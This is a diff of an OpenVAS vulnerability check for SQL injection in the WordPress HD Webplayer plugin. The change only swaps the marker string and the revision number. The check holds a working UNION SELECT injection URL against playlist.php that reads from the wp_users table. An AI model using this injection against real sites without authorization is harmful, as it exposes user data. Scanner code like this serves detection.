@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_wordpress_hd_webplayer_plugin_mult_sql_inj_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
+# $Id: secpod_wordpress_hd_webplayer_plugin_mult_sql_inj_vuln.nasl 11435 2018-09-17 13:44:25Z cfischer $
 #
 # WordPress HD Webplayer Plugin Multiple SQL Injection Vulnerabilities
 #
@@ -29,7 +29,7 @@ CPE = "cpe:/a:wordpress:wordpress";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.903039");
-  script_version("$Revision: 11374 $");
+  script_version("$Revision: 11435 $");
   script_bugtraq_id(55259);
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
@@ -82,7 +82,7 @@ if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);
 
 foreach player(make_list("webplayer", "hd-webplayer")){
 
-  url = dir + '/wp-content/plugins/' + player + '/playlist.php?videoid=1+/*!UNION*/+/*!SELECT*/+group_concat(ID,0x3a,0x4f70656e564153,0x3a,0x4f70656e564153,0x3b),2,3,4';
+  url = dir + '/wp-content/plugins/' + player + '/playlist.php?videoid=1+/*!UNION*/+/*!SELECT*/+group_concat(ID,0x3a,0x53514c692d54657374,0x3a,0x53514c692d54657374,0x3b),2,3,4';
 
   # The Number of columns may be different. Considering columns till 15
   for(i = 5; i <= 15; i++){
@@ -90,7 +90,7 @@ foreach player(make_list("webplayer", "hd-webplayer")){
     url = url + ',' + i;
     exploit = url + '+from+wp_users';
 
-    if(http_vuln_check(port:port, url:exploit, pattern:">[0-9]+:OpenVAS:OpenVAS", check_header:TRUE, extra_check:make_list("<playlist>", "hdwebplayer.com"))){
+    if(http_vuln_check(port:port, url:exploit, pattern:">[0-9]+:SQLi-Test:SQLi-Test", check_header:TRUE, extra_check:make_list("<playlist>", "hdwebplayer.com"))){
       report = report_vuln_url(port:port, url:exploit);
       security_message(port:port, data:report);
       exit(0);
